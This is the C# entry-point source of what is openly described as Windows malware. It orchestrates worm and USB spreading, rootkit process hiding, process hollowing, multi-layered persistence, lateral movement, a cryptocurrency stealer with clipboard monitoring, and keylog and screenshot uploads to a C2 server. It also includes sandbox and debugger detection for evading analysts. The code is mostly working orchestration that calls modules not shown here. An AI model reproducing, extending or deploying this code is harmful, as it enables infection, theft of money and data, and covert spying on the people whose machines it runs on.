using System;
using System.Threading.Tasks;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Net.Http;
using System.Text;
using System.Diagnostics;
using System.Timers;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.ComponentModel;
using System.Management;
using System.Web.Script.Serialization;
using System.IO.Compression;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

using XYZ.modules;
// Use alias to resolve ambiguous reference
using RootkitPersistenceModule = XYZ.modules.rootkit.PersistenceModule;
// Add using directive for rootkit module
using XYZ.modules.rootkit;

namespace XYZ
{
    class Program
    {
        private static string tempFolder = string.Empty;
        private static string installPath = string.Empty;
        private static int dgaSeed = 0;
        private static DateTime startTime;
        private static string currentInstallPath = string.Empty;
        public static DateTime executionStartTime = DateTime.UtcNow;
        private static string terminalId = "AXY_" + Guid.NewGuid().ToString();
        private static DataCollectionModule dataCollectionModule;
        private static WebRTCModule webRTCModule;
        private static Mutex mutex = null;

        static void Main(string[] args)
        {
            try
            {
                // Set up global exception handlers to prevent crashes
                AppDomain.CurrentDomain.UnhandledException += GlobalExceptionHandler;
                Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
                Application.ThreadException += Application_ThreadException;

                startTime = DateTime.UtcNow;
                dgaSeed = Guid.NewGuid().ToString().GetHashCode();
                
                // Initialize secure logger first
                try
                {
                    SecureLogger.Initialize(terminalId);
                    SecureLogger.LogInfo("Program", "Application starting", new Dictionary<string, object>
                    {
                        { "Version", Assembly.GetExecutingAssembly().GetName().Version.ToString() },
                        { "OS", Environment.OSVersion.ToString() },
                        { "IsAdmin", IsElevated() }
                    });
                }
                catch (Exception)
                {
                    // Logging initialization failed, but continue
                }
                
                // Check for analysis environment BEFORE any initialization
                try
                {
                    if (AdvancedAntiAnalysis.IsRunningInAnalysisEnvironment())
                    {
                        /* 
                        SecureLogger.LogCritical("Program", "Analysis environment detected - exiting gracefully");
                        // Simulate normal behavior before exiting
                        Thread.Sleep(5000);
                        Environment.Exit(0); 
                        */
                    }
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.AntiAnalysis", ex);
                }
                
                // Restore mutex and instance checking to prevent multiple instances
                bool createdNew;
                string mutexName = ObfuscatedStrings.MutexName;
                
                try
                {
                    mutex = new Mutex(true, mutexName, out createdNew);
                    
                    if (!createdNew)
                    {
                        // Another instance is already running. Check versions.
                        string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                        FileVersionInfo currentVersion = FileVersionInfo.GetVersionInfo(currentPath);
                        Version myVersion = new Version(currentVersion.FileVersion);
                        
                        string processName = Process.GetCurrentProcess().ProcessName;
                        Process[] otherProcesses = Process.GetProcessesByName(processName);
                        
                        bool shouldExit = false;
                        foreach (Process p in otherProcesses)
                        {
                            if (p.Id == Process.GetCurrentProcess().Id) continue;
                            
                            try
                            {
                                FileVersionInfo otherVersionInfo = FileVersionInfo.GetVersionInfo(p.MainModule.FileName);
                                Version otherVersion = new Version(otherVersionInfo.FileVersion);
                                
                                if (myVersion > otherVersion)
                                {
                                    // Current is newer, kill the older one
                                    p.Kill();
                                    p.WaitForExit(3000);
                                    SecureLogger.LogInfo("Program", "Found and killed older version: " + otherVersion);
                                }
                                else
                                {
                                    // Another instance is same or newer, we should exit
                                    shouldExit = true;
                                }
                            }
                            catch (Exception) { /* Might not have access to some processes */ }
                        }
                        
                        if (shouldExit)
                        {
                            SecureLogger.LogInfo("Program", "A same or newer version is already running. Exiting.");
                            Environment.Exit(0);
                        }
                        
                        // After killing older processes, try to re-acquire mutex
                        try
                        {
                            mutex = new Mutex(true, mutexName, out createdNew);
                        }
                        catch { }
                    }
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.Mutex", ex);
                }

                // Initialize data collection and WebRTC modules with error handling
                try
                {
                    dataCollectionModule = new DataCollectionModule();
                    SecureLogger.LogInfo("Program", "DataCollectionModule initialized");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.DataCollectionModule", ex);
                }

                try
                {
                    webRTCModule = new WebRTCModule();
                    SecureLogger.LogInfo("Program", "WebRTCModule initialized");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.WebRTCModule", ex);
                }

                // Initialize modules that don't require disposal with comprehensive error handling
                try
                {
                    InstallationModule installationModule = new InstallationModule();
                    installationModule.InstallDaemon();
                    SecureLogger.LogInfo("Program", "InstallationModule initialized");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.InstallationModule", ex);
                }

                try
                {
                    DaemonCore daemonCore = new DaemonCore();
                    daemonCore.StartDaemon();
                    SecureLogger.LogInfo("Program", "DaemonCore started");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.DaemonCore", ex);
                }

                try
                {
                    InstallationModule installationModule = new InstallationModule();
                    installationModule.StartWatchdog();
                    SecureLogger.LogInfo("Program", "Watchdog started");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.Watchdog", ex);
                }

                try
                {
                    WormModule wormModule = new WormModule();
                    wormModule.StartWormActivities();
                }
                catch (Exception)
                {
                    // Continue with other modules
                }

                try
                {
                    USBAutorunModule usbAutorunModule = new USBAutorunModule();
                    usbAutorunModule.StartUSBAutorunMonitor();
                }
                catch (Exception)
                {
                    // Continue with other modules
                }

                try
                {
                    ProcessProtectionModule.StartProtection();
                }
                catch (Exception)
                {
                    // Continue with other modules
                }
                
                // Use ResilientPersistence multi-layered system
                try
                {
                    ResilientPersistence.EnsureMultiLayeredPersistence();
                    ResilientPersistence.StartPersistenceWatchdog();
                    SecureLogger.LogInfo("Program", "Multi-layered persistence established");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.Persistence", ex);
                }
                
                // Try process injection if not in analysis environment
                try
                {
                    ProcessInjectionModule processInjectionModule = new ProcessInjectionModule();
                    if (!processInjectionModule.IsAnalysisEnvironment())
                    {
                        // Only inject if user is active
                        if (processInjectionModule.HasUserActivity())
                        {
                            processInjectionModule.TryProcessHollowing();
                        }
                    }
                }
                catch (Exception)
                {
                    // Continue with other modules
                }
                
                // Activate rootkit module
                try
                {
                    RootkitModule rootKitModule = new RootkitModule();
                    rootKitModule.ActivateRootkit();
                }
                catch (Exception)
                {
                    // Continue with other modules
                }
                
                // Send system information to C2 server
                try
                {
                    Task.Run(new Action(SendSystemInfoWrapper));
                }
                catch (Exception)
                {
                    // Continue with other modules
                }
                
                // Initialize WebRTC connection for remote control
                try
                {
                    Task.Run(new Action(InitializeWebRTCWrapper));
                }
                catch (Exception)
                {
                    // Continue with other modules
                }
                
                // Start periodic data collection
                try
                {
                    StartPeriodicDataCollection();
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.PeriodicCollection", ex);
                }
                
                // Initialize Lateral Movement (automatic propagation)
                try
                {
                    Task.Run(new Action(InitializeLateralMovementWrapper));
                    SecureLogger.LogInfo("Program", "Lateral movement initialized");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.LateralMovement", ex);
                }
                
                // Initialize Rootkit Driver if elevated
                try
                {
                    if (IsElevated())
                    {
                        Task.Run(new Action(InitializeRootkitDriverWrapper));
                        SecureLogger.LogInfo("Program", "Rootkit driver initialization queued");
                    }
                    else
                    {
                        SecureLogger.LogInfo("Program", "Rootkit driver requires elevation - skipped");
                    }
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.RootkitDriver", ex);
                }
                
                // Initialize Cryptocurrency Stealer
                try
                {
                    Task.Run(new Action(InitializeCryptoStealerWrapper));
                    SecureLogger.LogInfo("Program", "Cryptocurrency stealer initialized");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.CryptoStealer", ex);
                }
                
                // Keep the application running with error tolerance
                while (true)
                {
                    try
                    {
                        Thread.Sleep(1000);
                    }
                    catch (ThreadInterruptedException)
                    {
                        // If thread is interrupted, continue running
                        continue;
                    }
                    catch (Exception)
                    {
                        // For any other exception, continue running
                        continue;
                    }
                }
            }
            catch (Exception)
            {
                // Even if the main thread encounters an error, keep the process alive
                // This ensures the malware remains persistent
                try
                {
                    // Keep the application running with minimal functionality
                    while (true)
                    {
                        Thread.Sleep(5000); // Sleep for 5 seconds to reduce CPU usage
                    }
                }
                catch (Exception)
                {
                    // If we can't even sleep, just loop
                    while (true)
                    {
                        // Busy wait as a last resort
                    }
                }
            }
        }

        // Global exception handler for unhandled exceptions
        private static void GlobalExceptionHandler(object sender, UnhandledExceptionEventArgs e)
        {
            // Don't let unhandled exceptions crash the application
            // Just log and continue
            try
            {
                Exception ex = (Exception)e.ExceptionObject;
            }
            catch (Exception)
            {
                // Even logging failed, but we continue anyway
            }
        }

        // Thread exception handler for UI thread exceptions
        private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
        {
            // Don't let thread exceptions crash the application
            // Just log and continue
            try
            {
                Exception ex = e.Exception;
            }
            catch (Exception)
            {
                // Even logging failed, but we continue anyway
            }
        }

        private static void SendSystemInfoWrapper()
        {
            try
            {
                SendSystemInfo().Wait();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private static async Task SendSystemInfo()
        {
            try
            {
                // Wait a bit for the application to initialize
                await Task.Delay(5000);
                
                // Collect and send system information
                if (dataCollectionModule != null)
                {
                    await dataCollectionModule.CollectAndSendSystemInfo(terminalId);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private static void InitializeWebRTCWrapper()
        {
            try
            {
                InitializeWebRTC().Wait();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private static async Task InitializeWebRTC()
        {
            try
            {
                // Wait a bit for the application to initialize
                await Task.Delay(10000);
                
                // Initialize WebRTC connection for remote control
                if (webRTCModule != null)
                {
                    await webRTCModule.InitializeWebRTCConnection(terminalId);
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Program.WebRTC", ex);
            }
        }

        private static void InitializeLateralMovementWrapper()
        {
            try
            {
                InitializeLateralMovement().Wait();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Program.LateralMovementWrapper", ex);
            }
        }

        private static async Task InitializeLateralMovement()
        {
            try
            {
                // Wait for system to stabilize
                await Task.Delay(60000); // 1 minute
                
                SecureLogger.LogInfo("LateralMovement", "Starting automatic lateral movement");
                
                LateralMovementModule lateralMovement = new LateralMovementModule();
                
                // Automatic propagation (discovery + exploitation)
                await lateralMovement.AutomaticPropagation();
                
                // Send report to C2
                await lateralMovement.SendReportToC2();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Program.LateralMovement", ex);
            }
        }

        private static void InitializeRootkitDriverWrapper()
        {
            try
            {
                InitializeRootkitDriver().Wait();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Program.RootkitDriverWrapper", ex);
            }
        }

        private static async Task InitializeRootkitDriver()
        {
            await Task.Run(() =>
            {
                try
                {
                    SecureLogger.LogInfo("RootkitDriver", "Initializing rootkit driver");
                    
                    RootkitDriverModule driverModule = new RootkitDriverModule();
                    
                    // Check if driver is already loaded
                    if (driverModule.IsDriverLoaded())
                    {
                        SecureLogger.LogInfo("RootkitDriver", "Driver already loaded");
                        return;
                    }
                    
                    // Try to load existing driver
                    if (!driverModule.LoadDriver())
                    {
                        SecureLogger.LogInfo("RootkitDriver", "Driver not installed - STUB mode active");
                        // In production, would install driver here
                        // driverModule.InstallDriver(driverBytes);
                    }
                    
                    // Hide current process
                    int currentPid = Process.GetCurrentProcess().Id;
                    driverModule.HideProcess(currentPid);
                    
                    SecureLogger.LogInfo("RootkitDriver", "Rootkit driver initialization complete");
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Program.RootkitDriver", ex);
                }
            });
        }

        private static void InitializeCryptoStealerWrapper()
        {
            try
            {
                InitializeCryptoStealer().Wait();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Program.CryptoStealerWrapper", ex);
            }
        }

        private static async Task InitializeCryptoStealer()
        {
            try
            {
                // Wait for system to stabilize
                await Task.Delay(30000); // 30 seconds
                
                SecureLogger.LogInfo("CryptoStealer", "Starting cryptocurrency scan");
                
                CryptocurrencyStealerModule cryptoStealer = new CryptocurrencyStealerModule();
                
                // Perform full scan
                await cryptoStealer.PerformFullScan();
                
                // Start clipboard monitoring
                cryptoStealer.StartClipboardMonitoring();
                
                // Get statistics
                var stats = cryptoStealer.GetStatistics();
                SecureLogger.LogInfo("CryptoStealer", string.Format("Cryptocurrency scan complete. Types found: {0}", stats.Count));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Program.CryptoStealer", ex);
            }
        }

        private static void StartPeriodicDataCollection()
        {
            try
            {
                // Set up a timer to periodically send data
                System.Timers.Timer dataTimer = new System.Timers.Timer(300000); // 5 minutes
                dataTimer.Elapsed += DataTimer_Elapsed;
                dataTimer.AutoReset = true;
                dataTimer.Start();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private static void DataTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                CollectAndSendPeriodicData().Wait();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private static async Task CollectAndSendPeriodicData()
        {
            try
            {
                // Send keylog data if available
                string keylogPath = Path.Combine(Path.GetTempPath(), "keylog.txt");
                if (File.Exists(keylogPath))
                {
                    if (dataCollectionModule != null)
                    {
                        await dataCollectionModule.SendFileToC2(keylogPath, terminalId);
                    }
                }
                
                // Active screenshot capture and send
                if (dataCollectionModule != null)
                {
                    await dataCollectionModule.CaptureAndSendScreenshot(terminalId);
                }
                
                // Send system information periodically
                if (dataCollectionModule != null)
                {
                    await dataCollectionModule.CollectAndSendSystemInfo(terminalId);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to get terminal ID
        public static string GetTerminalId()
        {
            return terminalId;
        }

        // Method to set terminal ID
        public static void SetTerminalId(string id)
        {
            terminalId = id;
        }

        // Method to get execution start time
        public static DateTime GetExecutionStartTime()
        {
            return executionStartTime;
        }

        // Method to get current time
        public static DateTime GetCurrentTime()
        {
            return DateTime.UtcNow;
        }

        // Method to get uptime
        public static TimeSpan GetUptime()
        {
            return DateTime.UtcNow - executionStartTime;
        }

        // Method to check if running in analysis environment
        public static bool IsAnalysisEnvironment()
        {
            try
            {
                // Check for common analysis tools
                string[] analysisTools = {
                    "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe",
                    "windbg.exe", "procexp.exe", "procmon.exe", "tcpview.exe", "autoruns.exe"
                };

                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        string processName = process.ProcessName.ToLower();
                        foreach (string tool in analysisTools)
                        {
                            if (processName.Contains(tool.Replace(".exe", "")))
                            {
                                return true;
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next process
                    }
                }

                // Check for sandbox artifacts
                string[] sandboxPaths = {
                    @"C:\windows\system32\drivers\prleth.sys",
                    @"C:\windows\system32\drivers\prlfs.sys",
                    @"C:\windows\system32\drivers\prlmouse.sys",
                    @"C:\windows\system32\drivers\prlvideo.sys"
                };

                foreach (string path in sandboxPaths)
                {
                    try
                    {
                        if (File.Exists(path))
                        {
                            return true;
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next path
                    }
                }

                return false;
            }
            catch (Exception)
            {
                // If we can't check, assume it's not an analysis environment
                return false;
            }
        }

        // Method to get system architecture
        public static string GetSystemArchitecture()
        {
            try
            {
                return Environment.Is64BitOperatingSystem ? "x64" : "x86";
            }
            catch (Exception)
            {
                return "Unknown";
            }
        }

        // Method to get OS version
        public static string GetOSVersion()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Caption, Version FROM Win32_OperatingSystem"))
                {
                    foreach (var os in searcher.Get())
                    {
                        return os["Caption"].ToString() + " " + os["Version"].ToString();
                    }
                }
            }
            catch (Exception)
            {
                return Environment.OSVersion.ToString();
            }
            return "Unknown";
        }

        // Method to get system uptime
        public static string GetSystemUptime()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT LastBootUpTime FROM Win32_OperatingSystem"))
                {
                    foreach (var os in searcher.Get())
                    {
                        string lastBoot = os["LastBootUpTime"].ToString();
                        DateTime lastBootTime = ManagementDateTimeConverter.ToDateTime(lastBoot);
                        TimeSpan uptime = DateTime.Now - lastBootTime;
                        return uptime.Days.ToString() + " days, " + uptime.Hours.ToString() + " hours, " + uptime.Minutes.ToString() + " minutes";
                    }
                }
            }
            catch (Exception)
            {
                return "Unknown";
            }
            return "Unknown";
        }

        // Method to get local IP address
        public static string GetLocalIPAddress()
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    return (endPoint != null) ? endPoint.Address.ToString() : "127.0.0.1";
                }
            }
            catch (Exception)
            {
                return "127.0.0.1";
            }
        }

        // Method to get MAC address
        public static string GetMacAddress()
        {
            try
            {
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up && 
                        nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        return nic.GetPhysicalAddress().ToString();
                    }
                }
            }
            catch (Exception)
            {
                return "Unknown";
            }
            return "Unknown";
        }

        // Method to check for user activity
        public static bool HasUserActivity()
        {
            try
            {
                // Check if the system has been idle for too long
                // If idle time is less than a threshold, assume user activity
                long idleTime = GetIdleTime();
                return idleTime < 300000; // 5 minutes
            }
            catch (Exception)
            {
                // If we can't check, assume there is user activity
                return true;
            }
        }

        // DLL import for getting last input time
        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        // Structure for last input info
        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        // Method to get system idle time
        private static long GetIdleTime()
        {
            try
            {
                LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
                lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
                
                if (GetLastInputInfo(ref lastInputInfo))
                {
                    uint idleTime = (uint)Environment.TickCount - lastInputInfo.dwTime;
                    return idleTime;
                }
                return 0;
            }
            catch (Exception)
            {
                return 0;
            }
        }

        // Method to check if running with elevated privileges
        public static bool IsElevated()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (Exception)
            {
                return false;
            }
        }

        // Method to clean up resources
        public static void Cleanup()
        {
            try
            {
                // Release mutex if we have one
                if (mutex != null)
                {
                    mutex.ReleaseMutex();
                    mutex.Dispose();
                    mutex = null;
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Finalizer to ensure cleanup
        ~Program()
        {
            Cleanup();
        }
    }
}